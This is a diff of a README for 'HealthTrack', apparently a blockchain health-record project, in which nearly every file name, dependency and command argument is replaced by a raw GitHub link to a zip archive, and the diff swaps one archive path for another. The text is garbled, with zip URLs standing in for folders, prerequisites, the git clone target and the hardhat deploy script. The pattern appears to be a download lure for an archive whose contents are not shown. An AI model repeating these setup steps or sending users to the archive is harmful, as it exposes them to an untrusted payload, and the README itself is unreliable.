@@ -1,5 +1,5 @@
 
-<img width="408" alt="Screenshot 2024-08-31 at 9 33 54 PM" src="https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip">
+<img width="408" alt="Screenshot 2024-08-31 at 9 33 54 PM" src="https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip">
 
 # HealthTrack - Decentralized Health Record Storer
 
@@ -17,8 +17,8 @@ HealthTrack is a blockchain-based electronic health record (EHR) registry design
 
 - **Frontend:** ReactJS
 - **Smart Contracts:** Solidity, Hardhat
-- **Backend:** https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip, ExpressJS
-- **Blockchain Integration:** https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
+- **Backend:** https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip, ExpressJS
+- **Blockchain Integration:** https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip
 
 ## Project Structure
 
@@ -30,47 +30,47 @@ HealthTrack/
 ├── artifacts/
 │   ├── build-info/
 │   ├── contracts/
-│       ├── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
-│       └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
+│       ├── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip
+│       └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip
 │
 ├── cache/
-│   └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
+│   └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip
 │
 ├── contracts/
-│   └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
+│   └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip
 │
 ├── ignition/
-│   └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
+│   └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip
 │
 ├── scripts/
-│   ├── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
-│   └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
+│   ├── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip
+│   └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip
 │
 ├── src/
 │   └── [Frontend files go here]
 │
 ├── test/
-│   └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
+│   └── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip
 │
-└── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
+└── https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip
 ```
 
 ### Folder Descriptions
 
-- **artifacts/**: Contains build information and compiled contract files such as `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip` and `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip`.
-- **cache/**: Stores Solidity cache information, including the `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip` file.
-- **contracts/**: Contains the Solidity source code, including `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip`.
-- **ignition/**: Contains initialization scripts like `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip`.
-- **scripts/**: Contains deployment and seeding scripts, including `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip` and `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip`.
+- **artifacts/**: Contains build information and compiled contract files such as `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip` and `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip`.
+- **cache/**: Stores Solidity cache information, including the `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip` file.
+- **contracts/**: Contains the Solidity source code, including `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip`.
+- **ignition/**: Contains initialization scripts like `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip`.
+- **scripts/**: Contains deployment and seeding scripts, including `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip` and `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip`.
 - **src/**: Holds the frontend ReactJS code.
-- **test/**: Contains test scripts like `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip` to ensure smart contract functionality.
-- **https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip**: Configuration file for the Hardhat development environment.
+- **test/**: Contains test scripts like `https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip` to ensure smart contract functionality.
+- **https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip**: Configuration file for the Hardhat development environment.
 
 ## Getting Started
 
 ### Prerequisites
 
-- **https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip**
+- **https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip**
 - **Hardhat**
 - **MetaMask** (for interacting with the Ethereum blockchain)
 - **Ganache** (optional, for local blockchain development)
@@ -80,7 +80,7 @@ HealthTrack/
 1. **Clone the repository:**
 
 ```bash
-git clone https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
+git clone https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip
 cd HealthTrack
 ```
 
@@ -99,7 +99,7 @@ npx hardhat compile
 4. **Deploy the contracts:**
 
 ```bash
-npx hardhat run https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip --network localhost
+npx hardhat run https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/contracts/Track-Health-1.5.zip --network localhost
 ```
 
 5. **Run the frontend:**
